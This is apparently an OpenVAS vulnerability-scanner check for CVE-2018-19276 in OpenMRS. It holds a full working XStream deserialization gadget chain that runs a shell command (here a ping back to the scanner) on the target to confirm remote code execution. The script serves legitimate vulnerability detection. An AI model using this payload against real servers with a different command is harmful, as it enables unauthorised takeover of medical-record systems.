# Copyright (C) 2019 Greenbone Networks GmbH
# Text descriptions are largely excerpted from the referenced
# advisory, and are Copyright (C) of the respective author(s)
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:openmrs:openmrs";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142136");
  script_version("2019-05-17T13:14:58+0000");
  script_tag(name:"last_modification", value:"2019-05-17 13:14:58 +0000 (Fri, 17 May 2019)");
  script_tag(name:"creation_date", value:"2019-03-13 09:16:06 +0700 (Wed, 13 Mar 2019)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2018-19276");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("OpenMRS RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_openmrs_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("openmrs/detected");

  script_tag(name:"summary", value:"OpenMRS is prone to a remote code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to execute the ping command and checks the response.");

  script_tag(name:"solution", value:"Update the webservices.rest module of OpenMRS to version 2.24.0 or later.");

  script_xref(name:"URL", value:"https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607");
  script_xref(name:"URL", value:"https://www.bishopfox.com/news/2019/02/openmrs-insecure-object-deserialization/");

  exit(0);
}

include("dump.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/ws/rest/v1/concept";
headers = make_array("Content-Type", "application/xml");

req = http_post_req(port: port, url: url, data: "", add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req);

if (res !~ "^HTTP/1\.[01] 500")
  exit(0);

vtstrings = get_vt_strings();
check = vtstrings["ping_string"];
pattern = hexstr(check);

if (host_runs("Windows") == "yes") {
  cmd = 'ping -c 5 ' + this_host();
  win = TRUE;
} else {
  cmd = 'ping -c 5 -p ' + pattern + ' ' + this_host();
}

data = '<map>\r\n  <entry>\r\n    <jdk.nashorn.internal.objects.NativeString>\r\n      <flags>0</flags>\r\n' +
       '     <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">\r\n' +
       '        <dataHandler>\r\n          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">\r\n' +
       '            <is class="javax.crypto.CipherInputStream">\r\n' +
       '              <cipher class="javax.crypto.NullCipher">\r\n' +
       '                <initialized>false</initialized>\r\n                <opmode>0</opmode>\r\n' +
       '                <serviceIterator class="javax.imageio.spi.FilterIterator">\r\n' +
       '                  <iter class="javax.imageio.spi.FilterIterator">\r\n' +
       '                    <iter class="java.util.Collections$EmptyIterator"/>\r\n' +
       '                    <next class="java.lang.ProcessBuilder">\r\n' +
       '                      <command>\r\n                        <string>/bin/bash</string>\r\n' +
       '                        <string>-c</string>\r\n  \t\t\t' +
       '<string>' + cmd + '</string>\r\n                      </command>\r\n' +
       '                      <redirectErrorStream>false</redirectErrorStream>\r\n' +
       '                    </next>\r\n                  </iter>\r\n' +
       '                  <filter class="javax.imageio.ImageIO$ContainsFilter">\r\n' +
       '                    <method>\r\n                      <class>java.lang.ProcessBuilder</class>\r\n' +
       '                      <name>start</name>\r\n                      <parameter-types/>\r\n' +
       '                    </method>\r\n                    <name>foo</name>\r\n                  </filter>\r\n' +
       '                  <next class="string">foo</next>\r\n                </serviceIterator>\r\n' +
       '                <lock/>\r\n              </cipher>\r\n' +
       '              <input class="java.lang.ProcessBuilder$NullInputStream"/>\r\n' +
       '              <ibuffer></ibuffer>\r\n              <done>false</done>\r\n' +
       '              <ostart>0</ostart>\r\n              <ofinish>0</ofinish>\r\n' +
       '              <closed>false</closed>\r\n            </is>\r\n            <consumed>false</consumed>\r\n' +
       '          </dataSource>\r\n          <transferFlavors/>\r\n        </dataHandler>\r\n' +
       '        <dataLen>0</dataLen>\r\n      </value>\r\n    </jdk.nashorn.internal.objects.NativeString>\r\n' +
       '    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>\r\n' +
       '  </entry>\r\n  <entry>\r\n' +
       '    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>\r\n' +
       '    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>\r\n' +
       '  </entry>\r\n</map>';

soc = open_sock_tcp(port);
if (!soc)
  exit(0);

req = http_post_req(port: port, url: url, data: data, add_headers: headers);
filter = string("icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip());
res = send_capture(socket: soc, data: req, timeout: 5, pcap_filter: filter);
close(soc);

if (res && check >< res) {
  report = 'It was possible to execute the command "' + cmd + '" on the remote host.\n\nReceived answer:\n\n' +
           hexdump( ddata:( res ));
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
